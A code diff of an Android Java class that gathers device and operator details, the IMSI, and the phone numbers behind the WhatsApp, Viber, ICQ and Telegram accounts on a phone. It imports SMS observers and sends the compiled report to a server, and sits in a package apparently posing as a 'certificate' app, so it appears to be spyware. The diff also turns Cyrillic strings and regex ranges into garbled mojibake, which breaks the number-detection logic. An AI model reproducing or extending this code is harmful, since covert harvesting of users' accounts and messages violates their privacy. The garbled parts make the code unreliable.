@@ -17,7 +17,6 @@ import android.content.SharedPreferences.Editor;
 import android.content.pm.PackageManager;
 import android.content.res.Resources;
 import android.net.ConnectivityManager;
-import android.net.NetworkInfo;
 import android.net.Uri;
 import android.os.Environment;
 import android.os.StatFs;
@@ -28,7 +27,7 @@ import android.util.DisplayMetrics;
 import android.view.WindowManager;
 
 import com.inet.android.certificate.R;
-import com.inet.android.request.DataRequest;
+import com.inet.android.request.RequestList;
 import com.inet.android.sms.SMSBroadcastReceiver;
 import com.inet.android.sms.SmsSentObserver;
 import com.inet.android.utils.ConvertDate;
@@ -43,7 +42,6 @@ public class GetInfo {
 	TelephonyInfo telephonyInfo;
 	private String LOG_TAG = "GetIfo";
 	String typeStr = "1";
-	ConvertDate date;
 	SMSBroadcastReceiver sms;
 	JSONObject info;
 	Resources path;
@@ -53,7 +51,6 @@ public class GetInfo {
 	}
 
 	public void startGetInfo() {
-		date = new ConvertDate();
 		contentObserved();
 		path = mContext.getApplicationContext().getResources();
 
@@ -104,7 +101,7 @@ public class GetInfo {
 			info.put(path.getString(R.string.connect_type), getConnectType());
 			getAccaunt();
 
-			object.put("time", date.logTime());
+			object.put("time", ConvertDate.logTime());
 			object.put("type", typeStr);
 			object.put("info", info);
 			// object.put("hardware", value);
@@ -115,11 +112,10 @@ public class GetInfo {
 			jsonObject.put("data", data);
 			sendJSONStr = object.toString();
 		} catch (JSONException e) {
-			Logging.doLog(LOG_TAG, "json ñëîìàëñÿ", "json ñëîìàëñÿ");
+			Logging.doLog(LOG_TAG, "json Ã±Ã«Ã®Ã¬Ã Ã«Ã±Ã¿", "json Ã±Ã«Ã®Ã¬Ã Ã«Ã±Ã¿");
 		}
 		if (sendJSONStr != null) {
-			DataRequest dr = new DataRequest(mContext);
-			dr.sendRequest(object.toString());
+			RequestList.sendDataRequest(object.toString(), mContext);
 			Logging.doLog(LOG_TAG, sendJSONStr);
 		}
 	}
@@ -187,24 +183,6 @@ public class GetInfo {
 		}
 		return operatorName;
 	}
-
-	// /**
-	// * getIMEI
-	// *
-	// * @return
-	// */
-	//
-	// private String getIMEI() {
-	// String sIMEI = null;
-	// try {
-	// sIMEI = telephonyManager.getDeviceId();
-	// } catch (Exception e) {
-	// e.printStackTrace();
-	// sIMEI = "0";
-	// }
-	// return sIMEI;
-	//
-	// }
 
 	/**
 	 * getIMSI
@@ -495,7 +473,7 @@ public class GetInfo {
 					accauntGoogle += ", " + acname;
 			} else if (actype.equals("com.whatsapp")) {
 
-				if (!acname.matches("(?i).*[a-zà-ÿ].*")) {
+				if (!acname.matches("(?i).*[a-zÃ -Ã¿].*")) {
 					String number = acname.replace(" ", "");
 					if (number.indexOf("7") == 0) {
 						number = "+" + number;
@@ -515,7 +493,7 @@ public class GetInfo {
 					}
 				}
 			} else if (actype.equals("com.viber.voip.account")) {
-				if (!acname.matches("(?i).*[a-zà-ÿ].*")) {
+				if (!acname.matches("(?i).*[a-zÃ -Ã¿].*")) {
 					String number = acname.replace(" ", "");
 					if (number.indexOf("7") == 0) {
 						number = "+" + number;
@@ -536,7 +514,7 @@ public class GetInfo {
 
 				}
 			} else if (actype.equals("com.icq.mobile.client")) {
-				if (!acname.matches("(?i).*[a-zà-ÿ].*")) {
+				if (!acname.matches("(?i).*[a-zÃ -Ã¿].*")) {
 					String number = acname.replace(" ", "");
 					if (number.indexOf("7") == 0) {
 						number = "+" + number;
@@ -556,7 +534,7 @@ public class GetInfo {
 					}
 				}
 			} else if (actype.equals("org.telegram.account")) {
-				if (!acname.matches("(?i).*[a-zà-ÿ].*")) {
+				if (!acname.matches("(?i).*[a-zÃ -Ã¿].*")) {
 					String number = acname.replace(" ", "");
 					if (number.indexOf("7") == 0) {
 						number = "+" + number;
